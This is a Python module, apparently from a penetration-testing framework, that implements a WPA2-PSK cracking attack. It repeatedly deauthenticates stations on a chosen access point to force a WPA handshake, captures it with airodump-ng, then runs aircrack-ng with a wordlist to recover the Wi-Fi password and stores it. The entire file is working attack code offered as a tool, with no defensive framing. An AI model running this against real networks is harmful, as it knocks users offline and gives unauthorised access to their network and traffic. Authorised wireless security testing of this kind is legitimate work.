# -*- coding: UTF-8 -*-
from lib.wifi import *


WPA_HANDSHAKE_REGEX = re.compile(r"WPA handshake\:\s+(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})")


class Wpa2pskCrack(WifiAttackModule, DeauthMixin):
    """ Capture a WPA handshake on the given BSSID and crack it with aircrack-ng.
    
    Author:  Yannick Pasquazzo
    Version: 1.0
    """
    config = Config({
        Option(
            'DEAUTH_INTERVAL',
            "Target station deauthentication interval (seconds)",
            False,
        ): 5,
        Option(
            'TIMEOUT',
            "Cracking maximum duration",
            True,
        ): 120,
        Option(
            'WORDLIST',
            "Wordlist for the password cracking",
            True,
        ): str(Path(__file__).absolute().parent.joinpath("wordlist.txt")),
    })
    path = "auxiliary/wifi"
    requirements = {'system': ["aircrack-ng/airmon-ng", "aircrack-ng/aireplay-ng", "aircrack-ng/airodump-ng"]}
    
    def postload(self):
        for p in self.__procs:
            p.wait()
        self.logger.debug("Removing temporary directory '{}'".format(self.temp_dir))
        self.temp_dir.rmtree()
        del self.temp_dir
    
    def preload(self):
        self.temp_dir = self.files.tempdir()
        self.__procs = []
        super(Wpa2pskCrack, self).preload()
    
    def prerun(self):
        r = super(Wpa2pskCrack, self).prerun()
        if len(self.console.state['TARGETS']) == 0:
            self.logger.warning("No target available yet ; please use the 'scan' command")
            return False
        return r
    
    def run(self):
        # local function for checking the WPA handshake regex
        def check_handshake(**kwargs):
            m = WPA_HANDSHAKE_REGEX.search(kwargs['line'])
            if m is not None:
                if kwargs['bssid'] == m.group("bssid"):
                    self.logger.info("WPA handshake captured !")
                    return True
        # capture packets on the target BSSID and stop when the WPA handshake is captured
        self.logger.warning("Press Ctrl+C to interrupt")
        t = self.console.state['TARGETS']
        essid = self.config.option('ESSID').value
        bssid = t[essid]['bssid']
        r = self.deauth(bssid,
                        interval=self.config.option('DEAUTH_INTERVAL').value,
                        timeout=self.config.option('TIMEOUT').value,
                        capture=self.temp_dir.joinpath("capture"),
                        post_func=check_handshake)
        if not r:
            self.logger.failure("WPA handshake could not be captured")
            return
        # FIXME: move temporary CAP with WPA handshake to workspace
        # collect the capture file with the WPA handshake and feed it to
        #  aircrack-ng
        cap = list(self.temp_dir.iterfiles(".cap"))[-1]
        wlist = self.config.option('WORDLIST').value
        cmd = "sudo aircrack-ng -w {} --bssid {} {}".format(wlist, bssid, cap)
        out, err = self.console._jobs.run(cmd)
        for line in out.splitlines():
            if "KEY FOUND!" in line:
                password = line.split("[ ", 1)[1].split(" ]", 1)[0]
                self.logger.success("Password found: {}".format(password))
                self.console.state['TARGETS'][essid]['password'] = password
                self.console.state['PASSWORDS'][essid] = password
                return
        self.logger.failure("Password could not be found")

